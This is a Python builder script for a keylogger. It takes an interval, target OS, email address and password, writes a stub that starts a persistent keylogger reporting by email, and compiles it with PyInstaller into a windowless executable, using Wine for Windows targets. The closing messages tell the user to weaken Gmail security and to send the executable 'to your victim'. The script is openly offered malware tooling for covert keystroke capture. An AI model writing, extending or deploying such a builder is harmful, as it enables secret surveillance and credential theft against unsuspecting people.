import os
import subprocess

WINDOWS_PYTHON_INTERPRETER_PATH = os.path.expanduser("~/.wine/drive_c/Python27/Scripts/pyinstaller.exe")


print("\n		interval->Time between reports in seconds.\n\n		operating->Your terget operating system(w-windows,l-linux)\n\n		email->Email address to send reports to.\n\n	"
                                            "	password->password for that email address.\n\n		file_name->Output file name\n\n	  "
                                            "Give the corresponding interval,operating,email,password,file_name by using space .\n\n  "
                                            "example:60 w Slogger@gmail.com 123456 keylogger")
interval,operating,email,password,out=input("\n\n\nso please :").split()



def create_keylogger(file_name, interval, email, password):
    with open(file_name, "w+") as file:
        file.write("import keylogger\n")
        file.write("Slogger = keylogger.Keylogger(" + interval + ",'" + email + "','" + password + "')\n")
        file.write("Slogger.become_persistent()\n")
        file.write("Slogger.start()\n")


def compile_for_windows(file_name):
    subprocess.call(["wine", WINDOWS_PYTHON_INTERPRETER_PATH, "--onefile", "--noconsole", file_name])


def compile_for_linux(file_name):
    subprocess.call(["pyinstaller", "--onefile", "--noconsole", file_name])

create_keylogger(out,interval,email,password)

if operating=="w":
    compile_for_windows(out)

if operating=="l":
    compile_for_linux(out)



print("Now following the below instruction.\n")
print("\n\n[***] Don't forget to allow less secure applications in your Gmail account.")
print("Use the following link to do so https://myaccount.google.com/lesssecureapps")
print("\n\nThen go to the dist directory and you can find your exe file then send it to your victim.")
